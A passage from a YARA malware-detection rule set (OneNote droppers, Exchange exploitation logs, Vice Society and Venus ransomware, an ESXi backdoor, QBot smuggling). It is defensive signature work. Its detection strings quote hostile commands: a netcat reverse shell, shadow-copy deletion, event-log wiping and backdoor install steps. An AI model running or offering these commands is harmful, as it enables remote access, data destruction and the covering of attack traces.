?? ?? ?? 4d 5a } \n      $x2 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac \n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [0-4] 40 65 63 68 6f } \n      $x3 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac \n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [0-4] 40 45 43 48 4f } \n      $x4 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac \n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [0-4] 4F 6E 20 45 } \n      $x5 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac \n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [0-4] 6F 6E 20 65 } \n      $x6 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac\n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? 4c 00 00 00 } \n      $x7 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac\n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? 49 54 53 46 } \n      $x8 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac\n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [6-200] 3C 68 74 61 3A } \n      $x9 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac\n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [6-200] 3C 48 54 41 3A } \n      $x10 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac\n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? ?? ?? ?? [6-200] 3C 6A 6F 62 20 } \n   condition: \n      filesize < 10MB and 1 of them\n}\n\nrule SUSP_OneNote_Embedded_FileDataStoreObject_Type_Jan23_2_RID3B08 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious embedded file types in OneNote files\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.didierstevens.com/\"\n      date = \"2023-01-27 20:11:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = { 00 e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac } \n      $s1 = \"<HTA:APPLICATION \" \n   condition: \n      filesize < 5MB and $a1 and 1 of ( $s* )\n}\n\nrule SUSP_Keepass_CVE_2023_24055_Jan23_RID3126 : CVE_2023_24055 DEMO SUSP {\n   meta:\n      description = \"Detects suspicious triggers defined in the Keepass configuration file, which could be indicator of the exploitation of CVE-2023-24055\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/alt3kx/CVE-2023-24055_PoC\"\n      date = \"2023-01-25 13:10:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_24055, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<TriggerCollection xmlns:xsi=\" ascii wide\n      $s1 = \"<Action>\" ascii wide\n      $s2 = \"<Parameter>\" ascii wide\n   condition: \n      filesize < 200KB and $a1 and all of ( $s* )\n}\n\nrule EXPL_ManageEngine_CVE_2022_47966_Jan23_1_RID3386 : CVE_2022_47966 DEMO EXPLOIT {\n   meta:\n      description = \"Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3\"\n      author = \"Florian Roth\"\n      reference = \"https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/\"\n      date = \"2023-01-13 14:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_47966, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|\" \n   condition: \n      1 of them\n}\n\nrule APT_MAL_RANSOM_ViceSociety_PolyVice_Jan23_1_RID361B : APT DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects NTRU-ChaChaPoly (PolyVice) malware used by Vice Society\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/labs/custom-branded-ransomware-the-vice-society-group-and-the-threat-of-outsourced-development/\"\n      date = \"2023-01-12 16:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-13\"\n      hash1 = \"326a159fc2e7f29ca1a4c9a64d45b76a4a072bc39ba864c49d804229c5f6d796\"\n      hash2 = \"8c8cb887b081e0d92856fb68a7df0dabf0b26ed8f0a6c8ed22d785e596ce87f4\"\n      hash3 = \"9d9e949ecd72d7a7c4ae9deae4c035dcae826260ff3b6e8a156240e28d7dbfef\"\n      tags = \"APT, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\root\\\\Desktop\\\\niX\\\\CB\\\\libntru\\\\\" ascii\n      $s1 = \"C:\\\\Users\\\\root\" ascii fullword\n      $s2 = \"#DBG: target = %s\" ascii fullword\n      $s3 = \"# ./%s [-p <path>]/[-f <file> ] [-e <enc.extension>] [-m <requirements file name>]\" ascii fullword\n      $s4 = \"### ################# ###\" ascii fullword\n      $op1 = { 89 ca 41 01 fa 89 ef 8b 6c 24 24 44 89 c9 09 d1 44 31 e6 89 c8 } \n      $op2 = { bd 02 00 00 00 29 cd 48 0f bf d1 8b 44 46 02 01 44 53 02 8d 54 0d 00 83 c1 02 48 0f bf c2 } \n      $op3 = { 48 29 c4 4c 8d 74 24 30 4c 89 f1 e8 46 3c 00 00 84 c0 41 89 c4 0f 85 2b 02 00 00 0f b7 45 f2 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them\n}\n\nrule APT_MAL_RANSOM_ViceSociety_Chily_Jan23_1_RID34E9 : APT DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects Chily or SunnyDay malware used by Vice Society\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/labs/custom-branded-ransomware-the-vice-society-group-and-the-threat-of-outsourced-development/\"\n      date = \"2023-01-12 15:50:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4dabb914b8a29506e1eced1d0467c34107767f10fdefa08c40112b2e6fc32e41\"\n      tags = \"APT, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".[Chily@Dr.Com]\" ascii fullword\n      $s1 = \"localbitcoins.com/buy_bitcoins'>https://localbitcoins.com/buy_bitcoins</a>\" ascii fullword\n      $s2 = \"C:\\\\Users\\\\root\\\\Desktop\" ascii fullword\n      $s3 = \"for /F \\\"tokens=*\\\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \\\"%1\\\"\" wide fullword\n      $s4 = \"cd %userprofile%\\\\documents\\\\\" wide\n      $s5 = \"noise.bmp\" wide fullword\n      $s6 = \" Execution time: %fms (1sec=1000ms)\" ascii fullword\n      $s7 = \"/c vssadmin.exe Delete Shadows /All /Quiet\" wide fullword\n      $op1 = { 4c 89 c5 89 ce 89 0d f5 41 02 00 4c 89 cf 44 8d 04 49 0f af f2 89 15 e9 41 02 00 44 89 c0 } \n      $op2 = { 48 8b 03 48 89 d9 ff 50 10 84 c0 0f 94 c0 01 c0 48 83 c4 20 5b } \n      $op3 = { 31 c0 47 8d 2c 00 45 85 f6 4d 63 ed 0f 8e ec 00 00 00 0f 1f 80 00 00 00 00 0f b7 94 44 40 0c 00 00 83 c1 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them\n}\n\nrule SUSP_ENV_Folder_Root_File_Jan23_1_RID32AE : DEMO SCRIPT SUSP {\n   meta:\n      description = \"Detects suspicious file path pointing to the root of a folder easily accessible via environment variables\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2023-01-11 14:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $xr1 = /%([Aa]pp[Dd]ata|APPDATA)%\\\\[A-Za-z0-9_\\-]{1,20}\\.[a-zA-Z0-9]{1,4}[^\\\\]/ wide ascii\n      $xr2 = /%([Pp]ublic|PUBLIC)%\\\\[A-Za-z0-9_\\-]{1,20}\\.[a-zA-Z0-9]{1,4}[^\\\\]/ wide ascii\n      $xr4 = /%([Pp]rogram[Dd]ata|PROGRAMDATA)%\\\\[A-Za-z0-9_\\-]{1,20}\\.[a-zA-Z0-9]{1,4}[^\\\\]/ wide ascii\n      $fp1 = \"perl -MCPAN \" ascii\n      $fp2 = \"CCleaner\" ascii\n   condition: \n      filesize < 20MB and 1 of ( $x* ) and not 1 of ( $fp* ) and not pe.number_of_signatures > 0\n}\n\nrule HKTL_NATBypass_Dec22_1_RID2E57 : DEMO G0096 HKTL T1090 {\n   meta:\n      description = \"Detects NatBypass tool (also used by APT41)\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/cw1997/NATBypass\"\n      date = \"2022-12-27 11:10:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4550635143c9997d5499d1d4a4c860126ee9299311fed0f85df9bb304dca81ff\"\n      tags = \"DEMO, G0096, HKTL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"nb -slave 127.0.0.1:3389 8.8.8.8:1997\" ascii\n      $x2 = \"| Welcome to use NATBypass Ver\" ascii\n      $s1 = \"main.port2host.func1\" ascii fullword\n      $s2 = \"start to transmit address:\" ascii\n      $s3 = \"^(\\\\d{1,2}|1\\\\d\\\\d|2[0-4]\\\\d|25[0-5])\\\\.(\\\\d{1,2}|1\\\\d\\\\d|2[0-4]\\\\d|25[0-5])\\\\.(\\\\d{1,2}|1\\\\d\\\\d|2[0-4]\\\\d|25[0-5])\\\\.(\\\\d{1,2}|1\\\\d\\\\d|2[0-4]\\\\d|25[0-5])\" \n   condition: \n      filesize < 8000KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them\n}\n\nrule EXPL_LOG_ProxyNotShell_OWASSRF_PowerShell_Proxy_Log_Dec22_1_RID3C7E : CVE_2022_41040 CVE_2022_41082 DEMO EXPLOIT LOG SCRIPT T1021_006 T1059_001 T1090 {\n   meta:\n      description = \"Detects traces of exploitation activity in relation to ProxyNotShell MS Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082\"\n      author = \"Florian Roth\"\n      reference = \"https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/\"\n      date = \"2022-12-22 21:14:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_41040, CVE_2022_41082, DEMO, EXPLOIT, LOG, SCRIPT, T1021_006, T1059_001, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/owa/mastermailbox%40outlook.com/powershell\" ascii wide\n      $sa1 = \" 200 \" ascii wide\n      $sa2 = \" POST \" ascii wide\n      $fp1 = \"ClientInfo\" ascii wide fullword\n      $fp2 = \"Microsoft WinRM Client\" ascii wide fullword\n      $fp3 = \"Exchange BackEnd Probes\" ascii wide fullword\n   condition: \n      all of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule EXPL_LOG_ProxyNotShell_OWASSRF_PowerShell_Proxy_Log_Dec22_2_RID3C7F : CVE_2022_41040 CVE_2022_41082 DEMO EXPLOIT LOG SCRIPT T1021_006 T1059_001 T1090 {\n   meta:\n      description = \"Detects traces of exploitation activity in relation to ProxyNotShell MS Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082\"\n      author = \"Florian Roth\"\n      reference = \"https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/\"\n      date = \"2022-12-22 21:14:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_41040, CVE_2022_41082, DEMO, EXPLOIT, LOG, SCRIPT, T1021_006, T1059_001, T1090\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $sr1 = / \\/owa\\/[^\\/\\s]{1,30}(%40|@)[^\\/\\s\\.]{1,30}\\.[^\\/\\s]{2,3}\\/powershell / ascii wide\n      $sa1 = \" 200 \" ascii wide\n      $sa2 = \" POST \" ascii wide\n      $fp1 = \"ClientInfo\" ascii wide fullword\n      $fp2 = \"Microsoft WinRM Client\" ascii wide fullword\n      $fp3 = \"Exchange BackEnd Probes\" ascii wide fullword\n   condition: \n      all of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule EXPL_LOG_ProxyNotShell_OWASSRF_PowerShell_Proxy_Log_Dec22_3_RID3C80 : CVE_2022_41040 CVE_2022_41082 DEMO EXPLOIT LOG SCRIPT T1021_006 T1059_001 T1090 {\n   meta:\n      description = \"Detects traces of exploitation activity in relation to ProxyNotShell MS Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082\"\n      author = \"Florian Roth\"\n      reference = \"https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/\"\n      date = \"2022-12-22 21:14:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_41040, CVE_2022_41082, DEMO, EXPLOIT, LOG, SCRIPT, T1021_006, T1059_001, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \" POST /powershell - 444 \" ascii wide\n      $sa2 = \" POST /Powershell - 444 \" ascii wide\n      $sb1 = \" - 200 0 0 2\" ascii wide\n      $fp1 = \"ClientInfo\" ascii wide fullword\n      $fp2 = \"Microsoft WinRM Client\" ascii wide fullword\n      $fp3 = \"Exchange BackEnd Probes\" ascii wide fullword\n   condition: \n      1 of ( $sa* ) and $sb1 and not 1 of ( $fp* )\n}\n\nrule EXPL_LOG_ProxyNotShell_PowerShell_Proxy_Log_Dec22_1_RID39FA : CVE_2022_41040 CVE_2022_41082 DEMO EXPLOIT LOG SCRIPT T1021_006 T1059_001 T1090 {\n   meta:\n      description = \"Detects traces of exploitation activity in relation to ProxyNotShell MS Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082\"\n      author = \"Florian Roth\"\n      reference = \"https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/\"\n      date = \"2022-12-22 19:26:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-26\"\n      tags = \"CVE_2022_41040, CVE_2022_41082, DEMO, EXPLOIT, LOG, SCRIPT, T1021_006, T1059_001, T1090\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $re1 = /,\\/[Pp][Oo][Ww][Ee][Rr][Ss][Hh][Ee][Ll][Ll][^\\n]{0,50},Kerberos,true,[^\\n]{0,50},200,0,,,,[^\\n]{0,2000};OnEndRequest\\.End\\.ContentType=application\\/soap\\+xml charset UTF-8;S:ServiceCommonMetadata\\.HttpMethod=POST;/ ascii wide\n      $fp1 = \"ClientInfo\" ascii wide fullword\n      $fp2 = \"Microsoft WinRM Client\" ascii wide fullword\n      $fp3 = \"Exchange BackEnd Probes\" ascii wide fullword\n   condition: \n      $re1 and not 1 of ( $fp* )\n}\n\nrule EXPL_MacOS_Switcharoo_Indicator_Dec22_RID34A9 : CVE_2022_46689 DEMO EXPLOIT MACOS {\n   meta:\n      description = \"Detects indicators found after exploitations of CVE-2022-46689\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/zhuowei/MacDirtyCowDemo\"\n      date = \"2022-12-19 15:40:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_46689, DEMO, EXPLOIT, MACOS\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"auth       sufficient     pam_permit.so\" ascii\n   condition: \n      filesize < 1KB and $x1\n}\n\nrule HKTL_Venom_LIB_Dec22_RID2DAD : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Venom - a library that meant to perform evasive communication using stolen browser socket\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Idov31/Venom\"\n      date = \"2022-12-17 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[ + ] Created detached hidden msedge process: \" fullword ascii\n      $ss1 = \"WS2_32.dll\" fullword ascii\n      $ss2 = \"WSASocketW\" fullword ascii\n      $ss3 = \"WSADuplicateSocketW\" fullword ascii\n      $ss5 = \"\\\\Device\\\\Afd\" wide fullword\n      $sx1 = \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe --no-startup-window\" fullword wide\n      $sx2 = \"[ + ] Data sent!\" fullword ascii\n      $sx3 = \"[ + ] Socket obtained!\" fullword ascii\n      $op1 = { 4c 8b f0 48 3b c1 48 b8 ff ff ff ff ff ff ff 7f } \n      $op2 = { 48 8b cf e8 1c 34 00 00 48 8b 5c 24 30 48 8b c7 } \n      $op3 = { 48 8b da 48 8b f9 45 33 f6 48 85 c9 0f 84 34 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( ( 3 of ( $ss* ) and all of ( $op* ) ) or 2 of ( $sx* ) ) or $x1 or all of ( $sx* )\n}\n\nrule APT_SH_ESXi_Backdoor_Dec22_RID2FFB : APT DEMO SCRIPT {\n   meta:\n      description = \"Detects malicious script found on ESXi servers\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers\"\n      date = \"2022-12-14 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mv /bin/hostd-probe.sh /bin/hostd-probe.sh.1\" ascii fullword\n      $x2 = \"/bin/nohup /bin/python -u /store/packages/vmtools.py\" ascii\n      $x3 = \"/bin/rm /bin/hostd-probe.sh.1\" \n   condition: \n      filesize < 10KB and 1 of them\n}\n\nrule APT_PY_ESXi_Backdoor_Dec22_RID3009 : APT DEMO SCRIPT T1059_006 {\n   meta:\n      description = \"Detects Python backdoor found on ESXi servers\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers\"\n      date = \"2022-12-14 12:22:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd = str(base64.b64decode(encoded_cmd), \" ascii\n      $x2 = \"sh -i 2>&1 | nc %s %s > /tmp/\" ascii\n   condition: \n      filesize < 10KB and 1 of them or all of them\n}\n\nrule MAL_Grace_Dec22_RID2BFB : DEMO MAL {\n   meta:\n      description = \"Detects Grace (aka FlawedGrace and GraceWire) RAT\"\n      author = \"X__Junior\"\n      reference = \"https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/\"\n      date = \"2022-12-13 09:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169\"\n      hash2 = \"e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"Grace finalized, no more library calls allowed.\" ascii\n      $sa2 = \"Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)\" ascii\n      $sa3 = \"AVWireCleanupThread\" ascii\n      $sa4 = \"AVTunnelClientDirectIO\" ascii\n      $sa5 = \"AVGraceTunnelWriteThread\" ascii\n      $sa6 = \"AVGraceTunnelClientDirectIO\" ascii\n   condition: \n      2 of them\n}\n\nrule APT_CryWiper_Dec22_RID2D59 : APT DEMO T1543_003 {\n   meta:\n      description = \"Detects CryWiper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist-ru.translate.goog/novyj-troyanec-crywiper/106114/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en\"\n      date = \"2022-12-05 10:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Software\\\\Sysinternals\\\\BrowserUpdate\" \n      $sx1 = \"taskkill.exe /f /im MSExchange*\" \n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" ascii\n      $s2 = \"fDenyTSConnections\" ascii\n   condition: \n      1 of ( $x* ) or all of ( $s* )\n}\n\nrule MAL_RANSOM_Venus_Nov22_1_RID2F10 : CRIME DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects Venus Ransomware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/dyngnosis/status/1592588860168421376\"\n      date = \"2022-11-16 11:41:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"46f9cbc3795d6be0edd49a2c43efe6e610b82741755c5076a89eeccaf98ee834\"\n      hash2 = \"6d8e2d8f6aeb0f4512a53fe83b2ef7699513ebaff31735675f46d1beea3a8e05\"\n      hash3 = \"931cab7fbc0eb2bbc5768f8abdcc029cef76aff98540d9f5214786dccdb6a224\"\n      tags = \"CRIME, DEMO, EXE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"<html><head><title>Venus</title><style type = \\\"text\" ascii fullword\n      $x2 = \"xXBLTZKmAu9pjcfxrIK4gkDp/J9XXATjuysFRXG4rH4=\" ascii fullword\n      $x3 = \"%s%x%x%x%x.goodgame\" wide fullword\n      $s1 = \"/c ping localhost -n 3 > nul & del %s\" ascii fullword\n      $s2 = \"C:\\\\Windows\\\\%s.png\" wide\n      $op1 = { 8b 4c 24 24 46 8b 7c 24 14 41 8b 44 24 30 81 c7 00 04 00 00 81 44 24 10 00 04 00 00 40 } \n      $op2 = { 57 c7 45 fc 00 00 00 00 7e 3f 50 33 c0 74 03 9b 6e } \n      $op3 = { 66 89 45 d4 0f 11 45 e8 e8 a8 e7 ff ff 83 c4 14 8d 45 e8 50 8d 45 a4 50 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( pe.imphash ( ) == \"bb2600e94092da119ee6acbbd047be43\" or 1 of ( $x* ) or 2 of them ) or 4 of them\n}\n\nrule HKTL_BruteRatel_Badger_Indicators_Oct22_4_RID362C : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Brute Ratel C4 badger indicators\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/embee_research/status/1580030310778953728\"\n      date = \"2022-10-12 16:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { b? 89 4d 39 8c } \n      $s2 = { b? bd ca 3b d3 } \n      $s3 = { b? b2 c1 06 ae } \n      $s4 = { b? 74 eb 1d 4d } \n   condition: \n      filesize < 8000KB and all of ( $s* ) and not uint8 ( 0 ) == 0x02\n}\n\nrule EXPL_Exchange_ProxyNotShell_Patterns_CVE_2022_41040_Oct22_1_RID3B59 : CVE_2022_41040 DEMO EXPLOIT SCRIPT {\n   meta:\n      description = \"Detects successful ProxyNotShell exploitation attempts in log files (attempt to identify the attack before the official release of detailed information)\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/kljunowsky/CVE-2022-41040-POC\"\n      date = \"2022-10-11 20:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-03-15\"\n      tags = \"CVE_2022_41040, DEMO, EXPLOIT, SCRIPT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $sr1 = / \\/autodiscover\\/autodiscover\\.json[^\\n]{1,300}owershell/ nocase ascii\n      $sa1 = \" 200 \" \n      $fp1 = \" 444 \" \n      $fp2 = \" 404 \" \n      $fp2b = \" 401 \" \n      $fp3 = \"GET /owa/ &Email=autodiscover/autodiscover.json%3F@test.com&ClientId=\" ascii\n      $fp4 = \"@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com\" ascii\n   condition: \n      $sr1 and 1 of ( $sa* ) and not 1 of ( $fp* )\n}\n\nrule MAL_QBot_HTML_Smuggling_Indicators_Oct22_1_RID3648 : DEMO MAL QAKBOT {\n   meta:\n      description = \"Detects double encoded PKZIP headers as seen in HTML files used by QBot\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ankit_anubhav/status/1578257383133876225?s=20&t=Bu3CCJCzImpTGOQX_KGsdA\"\n      date = \"2022-10-07 16:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f384bcba31fda53e504d0a6c85cee0ce3ea9586226633d063f34c53ddeaca3f\"\n      hash2 = \"8e61c2b751682becb4c0337f5a79b2da0f5f19c128b162ec8058104b894cae9b\"\n      hash3 = \"c5d23d991ce3fbcf73b177bc6136d26a501ded318ccf409ca16f7c664727755a\"\n      tags = \"DEMO, MAL, QAKBOT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sd1 = \"VUVzREJCUUFBUUFJQ\" \n      $sd2 = \"VFc0RCQlFBQVFBSU\" \n      $sd3 = \"VRXNEQkJRQUFRQUlB\" \n      $sdr1 = \"QJFUUBFUUCJERzVUV\" \n      $sdr2 = \"USBFVQBFlQCR0cFV\" \n      $sdr3 = \"BlUQRFUQRJkQENXRV\" \n      $st1 = \"VlVWelJFSkNVVUZCVVVGSl\" \n      $st2 = \"ZVVnpSRUpDVVVGQlVVRkpR\" \n      $st3 = \"WVVZ6UkVKQ1VVRkJVVUZKU\" \n      $st4 = \"VkZjMFJDUWxGQlFWRkJTV\" \n      $st5 = \"ZGYzBSQ1FsRkJRVkZCU1\" \n      $st6 = \"WRmMwUkNRbEZCUVZGQlNV\" \n      $st7 = \"VlJYTkVRa0pSUVVGUlFVbE\" \n      $st8 = \"ZSWE5FUWtKUlFVRlJRVWxC\" \n      $st9 = \"WUlhORVFrSlJRVUZSUVVsQ\" \n      $str1 = \"UUpGVVVCRlVVQ0pFUnpWVV\" \n      $str2 = \"FKRlVVQkZVVUNKRVJ6VlVW\" \n      $str3 = \"RSkZVVUJGVVVDSkVSelZVV\" \n      $str4 = \"VVNCRlZRQkZsUUNSMGNGV\" \n      $str5 = \"VTQkZWUUJGbFFDUjBjRl\" \n      $str6 = \"VU0JGVlFCRmxRQ1IwY0ZW\" \n      $str7 = \"QmxVUVJGVVFSSmtRRU5YUl\" \n      $str8 = \"JsVVFSRlVRUkprUUVOWFJW\" \n      $str9 = \"CbFVRUkZVUVJKa1FFTlhSV\" \n      $htm = \"<html\" ascii\n      $eml = \"Content-Transfer-Encoding:\" ascii\n   condition: \n      filesize < 10MB and ( ( 1 of ( $sd* ) and $htm and not $eml ) or ( 1 of ( $st* ) and $eml ) )\n}\n\nrule SUSP_MAL_EXFIL_Stealer_Output_Characteristics_Sep22_1_RID3A81 : DEMO FILE MAL SUSP T1020 {\n   meta:\n      description = \"Detects typical stealer output files as created by RedLine or Racoon stealer\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cglyer/status/1570965878480719873\"\n      date = \"2022-09-17 19:49:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = 